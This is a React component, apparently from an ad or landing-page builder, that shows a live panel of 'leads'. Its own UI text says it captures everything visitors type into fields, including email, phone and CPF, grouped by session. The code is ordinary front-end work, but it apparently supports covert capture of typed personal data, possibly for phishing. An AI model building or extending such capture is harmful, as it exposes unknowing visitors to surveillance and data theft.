import { useEffect, useMemo, useState } from "react";
import { supabase } from "@/integrations/supabase/client";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { Trash2, Activity, ChevronDown, ChevronRight, Copy } from "lucide-react";
import { toast } from "sonner";

interface LeadRow {
  id: string;
  ad_id: string;
  screen_id: string | null;
  session_id: string;
  field_name: string;
  value: string;
  user_agent: string | null;
  created_at: string;
  updated_at: string;
}

interface LeadsPanelProps {
  adId: string;
}

interface SessionGroup {
  session_id: string;
  first_seen: string;
  last_seen: string;
  user_agent: string | null;
  fields: Record<string, { value: string; updated_at: string }>;
  events: number;
}

function formatTime(iso: string): string {
  const d = new Date(iso);
  const today = new Date();
  const sameDay =
    d.getFullYear() === today.getFullYear() &&
    d.getMonth() === today.getMonth() &&
    d.getDate() === today.getDate();
  if (sameDay) {
    return d.toLocaleTimeString("pt-BR", { hour: "2-digit", minute: "2-digit", second: "2-digit" });
  }
  return d.toLocaleString("pt-BR", { day: "2-digit", month: "2-digit", hour: "2-digit", minute: "2-digit" });
}

function deviceLabel(ua: string | null): string {
  if (!ua) return "Desconhecido";
  if (/iPhone|iPad|iPod/i.test(ua)) return "iOS";
  if (/Android/i.test(ua)) return "Android";
  if (/Windows/i.test(ua)) return "Windows";
  if (/Mac OS/i.test(ua)) return "Mac";
  if (/Linux/i.test(ua)) return "Linux";
  return "Web";
}

function groupBySession(rows: LeadRow[]): SessionGroup[] {
  const map = new Map<string, SessionGroup>();
  for (const r of rows) {
    let g = map.get(r.session_id);
    if (!g) {
      g = {
        session_id: r.session_id,
        first_seen: r.created_at,
        last_seen: r.created_at,
        user_agent: r.user_agent,
        fields: {},
        events: 0,
      };
      map.set(r.session_id, g);
    }
    g.events += 1;
    if (r.created_at < g.first_seen) g.first_seen = r.created_at;
    if (r.created_at > g.last_seen) g.last_seen = r.created_at;
    if (!g.user_agent && r.user_agent) g.user_agent = r.user_agent;
    const cur = g.fields[r.field_name];
    if (!cur || r.created_at >= cur.updated_at) {
      g.fields[r.field_name] = { value: r.value, updated_at: r.created_at };
    }
  }
  return Array.from(map.values()).sort((a, b) => (a.last_seen < b.last_seen ? 1 : -1));
}

export function LeadsPanel({ adId }: LeadsPanelProps) {
  const [rows, setRows] = useState<LeadRow[]>([]);
  const [loading, setLoading] = useState(true);
  const [expanded, setExpanded] = useState<Set<string>>(new Set());
  const [pulse, setPulse] = useState(false);

  useEffect(() => {
    let mounted = true;
    setLoading(true);
    supabase
      .from("ad_leads")
      .select("*")
      .eq("ad_id", adId)
      .order("created_at", { ascending: false })
      .limit(500)
      .then(({ data, error }) => {
        if (!mounted) return;
        if (error) console.warn("[LeadsPanel] load:", error);
        setRows((data ?? []) as LeadRow[]);
        setLoading(false);
      });

    const channel = supabase
      .channel(`leads-${adId}`)
      .on(
        "postgres_changes",
        { event: "INSERT", schema: "public", table: "ad_leads", filter: `ad_id=eq.${adId}` },
        (payload) => {
          setRows((prev) => [payload.new as LeadRow, ...prev]);
          setPulse(true);
          setTimeout(() => setPulse(false), 600);
        },
      )
      .on(
        "postgres_changes",
        { event: "DELETE", schema: "public", table: "ad_leads", filter: `ad_id=eq.${adId}` },
        (payload) => {
          const old = payload.old as LeadRow;
          setRows((prev) => prev.filter((r) => r.id !== old.id));
        },
      )
      .subscribe();

    return () => {
      mounted = false;
      supabase.removeChannel(channel);
    };
  }, [adId]);

  const groups = useMemo(() => groupBySession(rows), [rows]);

  const handleClearAll = async () => {
    if (!confirm("Apagar todos os leads capturados desse anúncio?")) return;
    const { error } = await supabase.from("ad_leads").delete().eq("ad_id", adId);
    if (error) return toast.error(error.message);
    setRows([]);
    toast.success("Leads apagados");
  };

  const handleCopyValue = async (val: string) => {
    try {
      await navigator.clipboard.writeText(val);
      toast.success("Copiado");
    } catch {
      toast.error("Falhou");
    }
  };

  const toggle = (sid: string) => {
    setExpanded((prev) => {
      const next = new Set(prev);
      if (next.has(sid)) next.delete(sid);
      else next.add(sid);
      return next;
    });
  };

  return (
    <section className="mt-8 rounded-lg border border-border bg-card/50 p-4">
      <div className="mb-3 flex items-center justify-between gap-2">
        <div className="flex items-center gap-2">
          <span className={`relative flex h-2.5 w-2.5 ${pulse ? "" : ""}`}>
            <span className={`absolute inline-flex h-full w-full rounded-full bg-green-500 ${pulse ? "animate-ping opacity-75" : "opacity-0"}`} />
            <span className="relative inline-flex h-2.5 w-2.5 rounded-full bg-green-500" />
          </span>
          <h3 className="text-sm font-semibold">Leads ao vivo</h3>
          <Badge variant="secondary" className="text-[10px]">{groups.length} {groups.length === 1 ? "sessão" : "sessões"}</Badge>
        </div>
        {rows.length > 0 && (
          <Button size="sm" variant="ghost" onClick={handleClearAll} className="h-7 text-xs text-muted-foreground hover:text-destructive">
            <Trash2 className="mr-1 h-3 w-3" />
            Limpar
          </Button>
        )}
      </div>

      <p className="mb-3 text-xs text-muted-foreground">
        Captura tudo que o visitante digita nos campos. Use <code className="rounded bg-muted px-1 py-0.5 text-[10px]">{"{{lead.email}}"}</code> no HTML pra reutilizar o valor capturado.
      </p>

      {loading ? (
        <p className="py-6 text-center text-xs text-muted-foreground">Carregando...</p>
      ) : groups.length === 0 ? (
        <div className="flex flex-col items-center gap-2 py-6 text-center">
          <Activity className="h-5 w-5 text-muted-foreground" />
          <p className="text-xs text-muted-foreground">Aguardando alguém digitar algo...</p>
        </div>
      ) : (
        <div className="space-y-2">
          {groups.map((g) => {
            const isOpen = expanded.has(g.session_id);
            const fieldEntries = Object.entries(g.fields);
            const summary = (g.fields.email?.value || g.fields.phone?.value || g.fields.cpf?.value || g.fields.name?.value || fieldEntries[0]?.[1].value || "—").slice(0, 60);
            return (
              <div key={g.session_id} className="rounded-md border border-border bg-background">
                <button
                  type="button"
                  onClick={() => toggle(g.session_id)}
                  className="flex w-full items-center justify-between gap-2 px-3 py-2 text-left text-xs hover:bg-muted/50"
                >
                  <div className="flex min-w-0 items-center gap-2">
                    {isOpen ? <ChevronDown className="h-3 w-3 shrink-0" /> : <ChevronRight className="h-3 w-3 shrink-0" />}
                    <span className="truncate font-medium">{summary}</span>
                  </div>
                  <div className="flex shrink-0 items-center gap-2 text-[10px] text-muted-foreground">
                    <span>{deviceLabel(g.user_agent)}</span>
                    <span>•</span>
                    <span className="font-mono-tabular">{formatTime(g.last_seen)}</span>
                  </div>
                </button>
                {isOpen && (
                  <div className="border-t border-border px-3 py-2 space-y-1.5">
                    {fieldEntries.length === 0 ? (
                      <p className="text-[11px] text-muted-foreground">Sem dados</p>
                    ) : (
                      fieldEntries.map(([fname, fdata]) => (
                        <div key={fname} className="flex items-center justify-between gap-2 text-xs">
                          <div className="flex min-w-0 flex-1 items-center gap-2">
                            <span className="shrink-0 rounded bg-muted px-1.5 py-0.5 text-[10px] font-medium uppercase tracking-wide text-muted-foreground">
                              {fname}
                            </span>
                            <span className="truncate font-mono-tabular">{fdata.value || <em className="text-muted-foreground">vazio</em>}</span>
                          </div>
                          {fdata.value && (
                            <button
                              type="button"
                              onClick={() => handleCopyValue(fdata.value)}
                              className="shrink-0 rounded p-1 text-muted-foreground hover:bg-muted hover:text-foreground"
                              aria-label="Copiar"
                            >
                              <Copy className="h-3 w-3" />
                            </button>
                          )}
                        </div>
                      ))
                    )}
                    <p className="pt-1 text-[10px] text-muted-foreground">
                      Sessão: <span className="font-mono-tabular">{g.session_id.slice(0, 12)}…</span> • {g.events} eventos
                    </p>
                  </div>
                )}
              </div>
            );
          })}
        </div>
      )}
    </section>
  );
}
